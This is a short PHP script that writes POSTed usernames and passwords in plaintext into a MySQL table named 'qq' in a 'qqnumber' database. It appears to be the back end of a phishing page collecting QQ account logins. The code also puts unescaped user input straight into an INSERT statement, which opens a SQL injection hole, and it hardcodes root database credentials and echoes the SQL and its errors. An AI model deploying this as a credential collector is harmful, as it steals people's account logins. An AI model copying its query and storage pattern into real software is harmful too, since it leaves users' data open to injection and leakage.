<?php
$qqusername = $_POST["username"];
$qqpassword = $_POST["password"];

if ($qqusername == '' && $qqpassword == '') {
    echo "Type Is Empty";
}else
{
        // 连接数据库
        $servername = "localhost";
        $username = "root";
        $password = "123456";
    
        // 创建连接
        $conn = mysqli_connect($servername, $username, $password);
        // 检测连接
        if (!$conn) {
            die("Connection failed: " . mysqli_connect_error());
        }
        mysqli_select_db($conn, 'qqnumber');
        mysqli_query($conn, "set names utf8");
    
        $sql = "INSERT INTO qq " .
            "(username,password) " .
            "VALUES " .
            "('$qqusername','$qqpassword')";
    
        if (mysqli_query($conn, $sql)) {
            echo "新记录插入成功";
        } else {
            echo "Error: " . $sql . "<br>" . mysqli_error($conn);
        }
}



?>